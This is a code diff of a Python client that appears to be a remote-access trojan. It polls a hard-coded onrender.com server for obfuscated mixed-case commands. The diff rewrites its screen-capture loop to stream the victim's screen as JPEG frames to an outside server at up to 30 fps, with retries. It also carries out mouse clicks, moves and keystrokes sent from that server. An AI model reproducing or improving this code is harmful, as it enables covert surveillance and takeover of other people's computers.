@@ -13,12 +13,12 @@ from PIL import Image
 from mouse import move, click, wheel, double_click
 from io import BytesIO
 import time 
-import httpx
+import asyncio
+import aiohttp
 import keyboard
 from pyautogui import size
 from mss import mss
-import pynput
-url = "https://ms32-sha2.onrender.com/"
+url = "https://ms32-c67b.onrender.com/"
 # url = "http://192.168.9.115:5000/"
 screen = rs.get_primary_display()
 terminate = False
@@ -305,32 +305,79 @@ def showerr(num):
     except Exception as e:
         log(f"showerr thread error:\t{e}",state="WARN")
         
-def share():
+async def share(url):
     global sharing
-    with mss() as sct:
-        monitor = sct.monitors[1]
-        while sharing:
-            try:
-                start_time = time.time()
-                ss = sct.grab(monitor)
-                img = Image.frombytes("RGB", 
-                    (ss.width, ss.height), 
-                    ss.rgb)
-                buffer = BytesIO()
-                img.save(buffer,format="JPEG",quality=70)
-                buffer.seek(0)
-                rq.post(url+"screenshot", data=buffer.read())
-                elapsed_time = time.time() - start_time
-                fps = 1 / elapsed_time if elapsed_time > 0 else 0
-                print(f"FPS: {fps:.2f}")
-                fps_delay = max(0, 1/5 - elapsed_time)
-                sleep(fps_delay)
-            except httpx.ConnectTimeout:continue
+    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(keepalive_timeout=10)) as session:
+        with mss() as sct:
+            frame_count = 0
+            total_time = 0
+            fps_start_time = time.time()
+            monitor = sct.monitors[1]
+            full_screen_width = monitor['width']
+            full_screen_height = monitor['height']
+            while sharing:
+                try:
+                        # Start time for the frame
+                        start_time = time.time()
 
+                        # Capture the full screen
+                        screenshot = sct.grab(monitor)
+                        img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
+
+                        # Optional: Downscale the image if performance is an issue
+                        target_width = 1280  # Target width for downscaling
+                        target_height = int(target_width * full_screen_height / full_screen_width)  # Maintain aspect ratio
+                        img = img.resize((target_width, target_height), Image.Resampling.LANCZOS)  # Use LANCZOS for downsampling
+
+                        # Save the image to a buffer
+                        buffer = BytesIO()
+                        img.save(buffer, format="JPEG", quality=30)  # Lower quality for better performance
+                        buffer.seek(0)
+
+                        # Send the screenshot
+                        success = await send_screenshot(session, url, buffer)
+                        if success:
+                            frame_count += 1
+
+                        # Calculate elapsed time for this frame
+                        frame_time = time.time() - start_time
+                        total_time += frame_time
+
+                        # Calculate and log FPS every second
+                        if time.time() - fps_start_time >= 1.0:
+                            avg_fps = frame_count / (time.time() - fps_start_time)
+                            print(f"FPS: {avg_fps:.2f}")
+                            frame_count = 0
+                            total_time = 0
+                            fps_start_time = time.time()
+
+                        # Control the frame rate based on the processing time
+                        target_fps = 30  # Target FPS (you can adjust this as needed)
+                        sleep_time = max(0, 1 / target_fps - frame_time)
+                        await asyncio.sleep(sleep_time)
+
+                except Exception as e:print(f"Error: {e}")
+async def send_screenshot(session, url, buffer):
+    retries = 3
+    for attempt in range(retries):
+        try:
+            async with session.post(url, data=buffer.getvalue(), timeout=5) as response:
+                if response.status == 200:
+                    return True
+                else:
+                    print(f"Attempt {attempt + 1}: Server responded with {response.status}")
+        except Exception as e:
+            print(f"Attempt {attempt + 1}: Error: {e}")
+        await asyncio.sleep(2 ** attempt)  # Exponential backoff for retries
+    return False
+async def share_runner():
+    Thread(target=control).start()
+    url = "https://server-20zy.onrender.com/screenshot"  # Use your server URL
+    await share(url)
+def share_trig():
+    asyncio.run(share_runner())
 def control():
     global sharing
-    controller = pynput.keyboard.Controller()
-        # async with httpx.AsyncClient() as client:
     while sharing:
         try:
             data =  rq.get(url+"control")
@@ -348,7 +395,6 @@ def control():
                 elif data["mouse"] == 2:
                     click(button="right")
             elif data and data["type"] == "key" and data["btn"]:
-                #{"btn":[17,65],"type":"key"}
                 btns = []
                 for key in data["btn"]:
                     btns.append(chr(key)) if type(key) == int else btns.append(key)
@@ -363,9 +409,7 @@ def control():
                 y = data["y"]*(height/data["height"])            
                 move(x,y)
                 double_click()
-        except httpx.ConnectTimeout:continue
         except ValueError:continue
-
 
 def main():
     global sstate
@@ -420,8 +464,7 @@ def main():
                 Thread(target=showerr,args=(cmd,)).start()
             elif "sHaRe on" in cmd:
                 sharing = True
-                Thread(target=share).start()
-                Thread(target=control).start()
+                Thread(target=share_trig).start()
             elif "sHaRe off" in cmd:
                 sharing = False
             elif "sPeAk" in cmd:
